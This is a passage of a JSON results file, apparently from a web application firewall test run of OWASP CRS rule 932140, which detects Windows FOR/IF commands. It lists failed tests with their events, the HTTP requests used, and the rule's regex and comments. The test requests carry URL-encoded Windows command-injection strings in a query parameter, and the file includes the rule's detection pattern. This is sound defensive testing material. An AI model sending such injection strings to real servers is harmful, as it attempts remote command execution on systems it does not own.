        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 55,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 55,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%22usebackq+tokens%3D1%2C2%2A+delims%3D%2C%22+%25G+IN+%28%22C%3A%5CMy+Documents%5Cmy+textfile.txt%22%29+DO+ECHO+%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 56,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 56,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%22usebackq+tokens%3D1%2C2%2A+delims%3D%2C%22+%25%25G+IN+%28%22C%3A%5CMy+Documents%5Cmy+textfile.txt%22%29+DO+ECHO+%25%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 57,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 57,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+for+%2Ff+%5C%22delims%3D%5C%22+%25i+in+%28%27cmd+%2Fc+%5C%22set+%2Fa+%2863%2B21%29%5C%22%27%29+do+%40set+%2Fp+%3D+PDVQIS%25iPDVQISPDVQIS%3C+nul",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 58,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 58,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%3Bfor+%2Ff+%5C%22delims%3D%5C%22+%25i+in+%28%27cmd+%2Fc+%5C%22set+%2Fa+%2835%2B66%29%5C%22%27%29+do+%40set+%2Fp+%3D+LZEUZE%25iLZEUZELZEUZE%3C+nul%27",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
